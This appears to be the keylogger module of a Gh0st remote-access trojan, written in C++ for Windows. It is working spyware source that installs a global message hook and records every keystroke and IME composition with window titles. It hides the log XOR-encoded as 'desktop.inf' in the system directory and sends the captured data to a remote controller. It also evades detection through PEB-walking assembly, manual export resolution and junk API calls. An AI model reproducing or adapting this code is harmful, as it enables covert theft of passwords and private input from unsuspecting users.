// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"
#pragma comment(lib, "Imm32.lib")

bool g_bSignalHook = false;

TShared*	CKeyboardManager::m_pTShared = NULL;
HANDLE		CKeyboardManager::m_hMapping_File = NULL;
HINSTANCE	CKeyboardManager::g_hInstance = NULL;
DWORD		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
DWORD		CKeyboardManager::dwTickCount = GetTickCount();
char		CKeyboardManager::ConnPass[256] = {0};
HANDLE		CKeyboardManager::hProtect = NULL;
HANDLE		CKeyboardManager::hFile = NULL;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
pLoadLibraryA CKeyboardManager::MyLoadLibrary = NULL;
pGetProcAddress CKeyboardManager::MyGetProcAddress = NULL;
pclosesocket CKeyboardManager::Myclosesocket = NULL;
pGetSystemDirectoryA CKeyboardManager::MyGetSystemDirectory = NULL;
psend CKeyboardManager::Mysend = NULL;
pSleep CKeyboardManager::MySleep = NULL;
plstrcatA CKeyboardManager::Mylstrcat = NULL;
pGetTempPathA CKeyboardManager::MyGetTempPath = NULL;
pcapGetDriverDescriptionA CKeyboardManager::MycapGetDriverDescription = NULL;
pcapCreateCaptureWindowA CKeyboardManager::MycapCreateCaptureWindow = NULL;
pSetFilePointer CKeyboardManager::MySetFilePointer = NULL;
pMoveFileA CKeyboardManager::MyMoveFile = NULL;
pGetShortPathNameA CKeyboardManager::MyGetShortPathName = NULL;
pGetModuleFileNameA CKeyboardManager::MyGetModuleFileName = NULL;
//////////////////////////////////////////////////////////////////////

CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	g_bSignalHook = true;

	sendStartKeyBoard();
	WaitForDialogOpen();
	sendOfflineRecord();
	
	int	dwOffset = m_pTShared->dwOffset;

	while (m_pClient->IsRunning())
	{
		if (m_pTShared->dwOffset != dwOffset)
		{
			UINT	nSize;
			if (m_pTShared->dwOffset < dwOffset)
				nSize = m_pTShared->dwOffset;
			else
				nSize = m_pTShared->dwOffset - dwOffset;
			
			sendKeyBoardData((unsigned char *)&(m_pTShared->chKeyBoard[dwOffset]), nSize);
			
			dwOffset = m_pTShared->dwOffset;
		}
		Sleep(300);
	}

	if (!m_pTShared->bIsOffline)
		g_bSignalHook = false;
}

CKeyboardManager::~CKeyboardManager()
{

}

void CKeyboardManager::SaveToFile(char *lpBuffer)
{
	TCHAR szModule [MAX_PATH];
	HANDLE	hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	DWORD dwBytesWrite = 0;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	DWORD dwSize = GetFileSize(hFile, NULL);
	// 离线记录，小于50M
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (dwSize < 1024 * 1024 * 50)
		CKeyboardManager::MySetFilePointer(hFile, 0, 0, FILE_END);

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	WriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	CloseHandle(hFile);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	delete	lpEncodeBuffer;
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
}

void CKeyboardManager::SaveInfo(char *lpBuffer)
{
	TCHAR szModule [MAX_PATH];

	if (lpBuffer == NULL)
		return;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	DWORD	dwBytes = lstrlen(lpBuffer);

	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND hWnd = GetActiveWindow();

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);

	if(hWnd != m_pTShared->hActWnd)
	{
		m_pTShared->hActWnd = hWnd;
		char strCapText[256];
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		GetWindowText(m_pTShared->hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		GetLocalTime(&SysTime);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		memset(strSaveString, 0, sizeof(strSaveString));
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		wsprintf
			(
			strSaveString,
			"\r\n(%04d/%02d/%02d %02d:%02d:%02d) [%s]\r\n",
			SysTime.wYear,SysTime.wMonth, SysTime.wDay,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
			);
		// 让函认为是应该保存的
		SaveInfo(strSaveString);	
	}

	if (m_pTShared->bIsOffline)
	{
		SaveToFile(lpBuffer);
	}

	// reset
	if ((m_pTShared->dwOffset + dwBytes) > sizeof(m_pTShared->chKeyBoard))
	{
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		memset(m_pTShared->chKeyBoard, 0, sizeof(m_pTShared->chKeyBoard));
		m_pTShared->dwOffset = 0;
	}
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	lstrcat(m_pTShared->chKeyBoard, lpBuffer);
	m_pTShared->dwOffset += dwBytes;
}

LRESULT CALLBACK CKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	TCHAR szModule [MAX_PATH];

	MSG*	pMsg;
	char	strChar[2];
	char	KeyName[20];
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);

	pMsg = (MSG*)(lParam);
	// 防止消息重复产生记录重复，以pMsg->time判断
	if  (
		(nCode != HC_ACTION) || 
		((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(m_dwLastMsgTime == pMsg->time)
		)
	{
		return result;
	}

	m_dwLastMsgTime = pMsg->time;

	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		HIMC	hImc = ImmGetContext(hWnd);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		LONG	strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		// 考虑到UNICODE
		strLen += sizeof(WCHAR);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		ImmReleaseContext(hWnd, hImc);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		SaveInfo(m_pTShared->str);
	}

	if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveInfo(strChar);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveInfo("\r\n");
		}
		// 控制字符
		else
		{
			CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
			memset(KeyName, 0, sizeof(KeyName));
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				lstrcat(KeyName, "]");
				SaveInfo(KeyName);
			}
		}
	}
	return result;
}

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	if (lpBuffer[0] == COMMAND_NEXT)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		NotifyDialogIsOpen();
	}

	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		m_pTShared->bIsOffline = !m_pTShared->bIsOffline;
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		if (!m_pTShared->bIsOffline)
			DeleteFile(m_pTShared->strRecordFile);
		else
		{
			CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
			if (GetFileAttributes(m_pTShared->strRecordFile) == -1)
			{
				CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
				HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
					CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
				CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
				CloseHandle(hFile);
			}
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && m_pTShared->bIsOffline)
	{
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		CloseHandle(hFile);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	}
}

bool CKeyboardManager::Initialization()
{
	TCHAR szModule [MAX_PATH];

	CShareRestrictedSD ShareRestrictedSD;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	/*
	HANDLE CreateFileMapping(
		HANDLE hFile,                       //物理文件句柄
		LPSECURITY_ATTRIBUTES lpAttributes, //安全设置
		DWORD flProtect,                    //保护设置
		DWORD dwMaximumSizeHigh,            //高位文件大小
		DWORD dwMaximumSizeLow,             //低位文件大小
		LPCTSTR lpName                      //共享内存名称
		);
	*/
	m_hMapping_File = CreateFileMapping((HANDLE)0xFFFFFFFF, ShareRestrictedSD.GetSA(), PAGE_READWRITE, 0, sizeof(TShared), "_WCWJSJPJLLZMD");
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (m_hMapping_File == NULL) return false;

	// 注意m_pTShared不能进行清零操作，因为对像已经存在, 要在StartHook里进行操作
	m_pTShared = (TShared *)MapViewOfFile(m_hMapping_File, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	if (m_pTShared == NULL)
		return false;

	return true;
}

bool CKeyboardManager::StartHook()
{
	TCHAR szModule [MAX_PATH];

	if (!Initialization())
		return false;

	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	ZeroMemory(m_pTShared, sizeof(TShared));

	g_bSignalHook = true;

	m_dwLastMsgTime = GetTickCount();
	m_pTShared->hActWnd = NULL;
	m_pTShared->hGetMsgHook = NULL;
	m_pTShared->dwOffset = 0;
	
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));

	__try
	{
		StartService(NULL,NULL,NULL);
	}
	__finally
	{
		__asm nop;
	}
	GetSystemDirectory(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	lstrcat(m_pTShared->strRecordFile, "\\desktop.inf");

	// 文件存在，就开始离线记录开启
	if ( GetFileAttributes(m_pTShared->strRecordFile) != -1 )
	{
		m_pTShared->bIsOffline = true;
	}
	else
		m_pTShared->bIsOffline = false;

	if (m_pTShared->hGetMsgHook == NULL)
	{
		SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
		m_pTShared->hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
		CloseServiceHandle(hSCM);
	}

	return true;
}

void CKeyboardManager::StopHook()
{
	TCHAR szModule [MAX_PATH];
	SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
	if (m_pTShared->hGetMsgHook != NULL)
		UnhookWindowsHookEx(m_pTShared->hGetMsgHook);

	m_pTShared->hGetMsgHook = NULL;


	UnmapViewOfFile(m_pTShared);
	CloseServiceHandle(hSCM);
	CloseHandle(m_hMapping_File);
	closesocket(NULL);
	m_pTShared = NULL;
}

int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)m_pTShared->bIsOffline;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	TCHAR szModule [MAX_PATH];

	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	TCHAR szModule [MAX_PATH];
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	char	strRecordFile[MAX_PATH];
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	lstrcat(strRecordFile, "\\desktop.inf");
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
		char *lpBuffer = new char[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		CKeyboardManager::MyGetShortPathName(szModule,szModule,MAX_PATH);
		// 解密
		for (int i = 0; i < dwSize; i++)
			lpBuffer[i] ^= XOR_ENCODE_VALUE;
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete lpBuffer;
	}
	CloseHandle(hFile);
	CKeyboardManager::MyGetModuleFileName(NULL,szModule,MAX_PATH);
	return nRet;
}

/************************************************************************/
/* 
获取Kernel32.dll的地址
*/
/************************************************************************/
DWORD GetKernelModule()//获取Kernel32基地址，等同于LoadLibrary("Kernel32.dll")
{
	DWORD Ret = 0;
	__asm
	{
		
		/*          Gh0st.exe3.6 源代码中是适用于WinXp 环境寻找Kernel32.dll的代码
		pushad
			mov eax,dword ptr fs:[0x30]			//pointer to PEB 
			mov eax,dword ptr [eax+0x0c]		//pointer to loader data 
			mov eax,dword ptr [eax+0x1c]		//first entry in initialization order list (ntdll.dll) 
			mov eax,dword ptr [eax]				//second entry int initialization order list (kernel32.dll) 
			mov eax,dword ptr [eax+0x08]		//base addr of kernel32.dll 
			mov Ret,eax
		popad
*/
		MOV  EAX,DWORD PTR FS:[30H]  
		MOV  EAX,DWORD PTR [EAX+0CH]
		MOV  EAX,DWORD PTR [EAX+1CH] 
		//...................................................................................................

		PUSH 0x006c006c      
			PUSH 0x0064002e
			PUSH 0x00320033
			PUSH 0x006c0065
			PUSH 0x006e0072
			PUSH 0x0065006B            
			MOV ESI,ESP

_LOOP:           
		XOR ECX,ECX
			MOV EAX,DWORD PTR [EAX]        //LDR_MODULE链表头的Flink指针
		LEA EBX,DWORD PTR [EAX+1CH]    //获取_LDR_DATA_TABLE_ENTRY结构中的成员BaseDllName指针
		MOV CX,WORD PTR [EBX]         //获取BaseDllName->Length
		MOV EDI,DWORD PTR [EBX+4H]    //获取BaseDllName->buffer

		CMP ECX,0
			JE  _LOOP
			CMP CX, 24
			JNE  _LOOP

			PUSH EAX                     //保存LDR_MODULE链表指针
			//...................................................................................................            
			push  ECX                   //strcmpwi函数的三个参数
			push  ESI
			push  EDI                            
			//...................................................................................................  
			push    0                    //填充返回伪值
			push    ebp
			mov     ebp, esp
			sub     esp, 48h
			push    ebx
			push    esi
			push    edi
			lea     edi, [ebp-48H]
		mov     ecx, 12h
			mov     eax, 0CCCCCCCCh
			rep stosd
			mov     [ebp-4], 0
			jmp     short loc_40104A


loc_401041:
		mov     eax, [ebp-4]
		add     eax, 1
			mov     [ebp-4], eax

loc_40104A:
		mov     ecx, [ebp-4]
		cmp     ecx, [ebp+10H]
		jnb     short loc_40109D
			mov     edx, [ebp+8H]
		add     edx, [ebp-4]
		xor     eax, eax
			mov     al, [edx]
		cmp     eax, 41h
			jl      short loc_401080
			mov     ecx, [ebp+8]
		add     ecx, [ebp-4]
		xor     edx, edx
			mov     dl, [ecx]
		cmp     edx, 5Ah
			jg      short loc_401080
			mov     eax, [ebp+8]
		add     eax, [ebp-4]
		xor     ecx, ecx
			mov     cl, [eax]
		add     ecx, 20h
			mov     byte ptr [ebp-8], cl

loc_401080:
		mov     edx, [ebp-8]
		and     edx, 0FFh
			mov     eax, [ebp+0ch]
		add     eax, [ebp-4]
		xor     ecx, ecx
			mov     cl, [eax]
		cmp     edx, ecx
			jz      short loc_40109B
			xor     eax, eax
			jmp     short loc_4010A2


loc_40109B:
		jmp     short loc_401041


loc_40109D:
		mov     eax, 1

loc_4010A2:
		pop     edi
			pop     esi
			pop     ebx
			mov     esp, ebp
			pop     ebp
			add     esp,16                  //平衡堆栈
			//...................................................................................................                
			CMP EAX,0
			JNE  _FINDED
			POP EAX
			JMP  _LOOP

_FINDED:
		POP  EAX
			MOV EAX, DWORD PTR[EAX + 8]   //获取kernel32.dll的基地址
			MOV Ret, EAX
		ADD ESP, 24
	}
	return Ret;
}

int Mystrcmp(const char *cs, const char *ct)
{
	signed char __res;
	while (1) {
		if ((__res = *cs - *ct++) != 0 || !*cs++)
			break;
	}
	return __res;
}

/************************************************************************/
/* 
返回 GetProcAddress函数的地址
*/
/************************************************************************/
DWORD MyGetProAddress( HMODULE phModule,char* pProcName )
{
	
	if (!phModule) return 0;
	PIMAGE_DOS_HEADER pimDH = (PIMAGE_DOS_HEADER)phModule;
	PIMAGE_NT_HEADERS pimNH = (PIMAGE_NT_HEADERS)((char*)phModule+pimDH->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pimED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)phModule+pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pExportSize = pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD pResult = 0;
	
	if ((DWORD)pProcName < 0x10000)
	{
		if ((DWORD)pProcName >= pimED->NumberOfFunctions+pimED->Base || (DWORD)pProcName < pimED->Base) return 0;
		pResult = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[(DWORD)pProcName-pimED->Base];
	}
	else
	{
		DWORD* pAddressOfNames = (DWORD*)((DWORD)phModule+pimED->AddressOfNames);
		for (unsigned long i=0;i < pimED->NumberOfNames ; i++)
		{
			char* pExportName = (char*)(pAddressOfNames[i]+(DWORD)phModule);
			if (Mystrcmp(pProcName,pExportName) == 0)
			{
				WORD* pAddressOfNameOrdinals = (WORD*)((DWORD)phModule+pimED->AddressOfNameOrdinals);
				pResult  = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[pAddressOfNameOrdinals[i]];
				break;
			}
		}
	}
	if (pResult != 0 && pResult >= (DWORD)pimED && pResult < (DWORD)pimED+pExportSize)
	{
		char* pDirectStr = (char*)pResult;
		bool pstrok = false;
		while (*pDirectStr)
		{
			if (*pDirectStr == '.')
			{
				pstrok = true;
				break;
			}
			pDirectStr++;
		}
		if (!pstrok) return 0;
		char pdllname[MAX_PATH];
		int  pnamelen = pDirectStr - (char*)pResult;
		if (pnamelen <= 0) return 0;
		memcpy(pdllname,(char*)pResult,pnamelen);
		pdllname[pnamelen] = 0;
		HMODULE phexmodule = GetModuleHandle(pdllname);
		pResult = MyGetProAddress(phexmodule,pDirectStr+1);
	}
	return pResult;
}

DWORD GetSelfModule()//获取自身基地址，等同于GetModuleHanle(NULL)，适用于EXE
{
	DWORD Ret = 0;
	__asm
	{
		PUSH EAX
		MOV EAX,dword ptr fs:[0x30]
		MOV EAX,dword ptr [eax+8h]
		MOV Ret,EAX
		POP EAX
	}
	return Ret;
}


/************************************************************************/
/* 
获取所有远程函数地址
*/
/************************************************************************/
BOOL	CKeyboardManager::MyFuncInitialization()
{
	HMODULE hKernel32 = (HMODULE)GetKernelModule();
	MyLoadLibrary = (pLoadLibraryA)MyGetProAddress( hKernel32, "LoadLibraryA" );
	if (!MyLoadLibrary) 
		return FALSE;
	MyGetProcAddress = (pGetProcAddress)MyGetProAddress( hKernel32, "GetProcAddress" );
	if (!MyGetProcAddress) 
		return FALSE;
	HMODULE hWs2_32 = MyLoadLibrary("Ws2_32.dll");
	HMODULE hAVICAP32 = MyLoadLibrary("AVICAP32.dll");

///////////////////////////////////////////////////////////////////////////////////////////////////////

	MyGetSystemDirectory = (pGetSystemDirectoryA)MyGetProAddress( hKernel32, "GetSystemDirectoryA" );
	if (!MyGetSystemDirectory) 
		return FALSE;
	MySleep = (pSleep)MyGetProAddress( hKernel32, "Sleep" );
	if (!MySleep)
		return FALSE;
	Mylstrcat = (plstrcatA)MyGetProAddress( hKernel32, "lstrcatA" );
	if (!Mylstrcat) 
		return FALSE;
	MyGetTempPath = (pGetTempPathA)MyGetProAddress( hKernel32, "GetTempPathA" );
	if (!MyGetTempPath) 
		return FALSE;
	MySetFilePointer = (pSetFilePointer)MyGetProAddress( hKernel32, "SetFilePointer" );
	if (!MySetFilePointer) 
		return FALSE;
	MyMoveFile = (pMoveFileA)MyGetProAddress( hKernel32, "MoveFileA" );
	if (!MyMoveFile)
		return FALSE;
	MyGetShortPathName = (pGetShortPathNameA)MyGetProAddress( hKernel32, "GetShortPathNameA" );
	if (!MyGetShortPathName) 
		return FALSE;
	MyGetModuleFileName = (pGetModuleFileNameA)MyGetProAddress( hKernel32, "GetModuleFileNameA" );
	if (!MyGetModuleFileName)
		return FALSE;
///////////////////////////////////////////////////////////////////////////////////////////////////////
	Myclosesocket = (pclosesocket)MyGetProcAddress(hWs2_32,"closesocket");
	if (!Myclosesocket) 
		return FALSE;
	Mysend = (psend)MyGetProcAddress(hWs2_32,"send");
	if (!Mysend) 
		return FALSE;

///////////////////////////////////////////////////////////////////////////////////////////////////////

	MycapGetDriverDescription = (pcapGetDriverDescriptionA)MyGetProcAddress(hAVICAP32,"capGetDriverDescriptionA");
	if (!MycapGetDriverDescription) 
		return FALSE;
	MycapCreateCaptureWindow = (pcapCreateCaptureWindowA)MyGetProcAddress(hAVICAP32,"capCreateCaptureWindowA");
	if (!MycapCreateCaptureWindow)
		return FALSE;

	return TRUE;
}

int CKeyboardManager::Mylstrlen( const char *str )    //输入参数const
{
	if ( str == NULL ) return 0;    //字符串地址非0
	int len = 0;
	while( (*str++) != '\0' )
	{
		len++;
	}
	return len;
}

#include <stdlib.h>
char* CKeyboardManager::NumToStr( DWORD Nos, int JZ )
{
	char Res[256] = {0};
	itoa( Nos, Res, JZ );
	return Res;
}
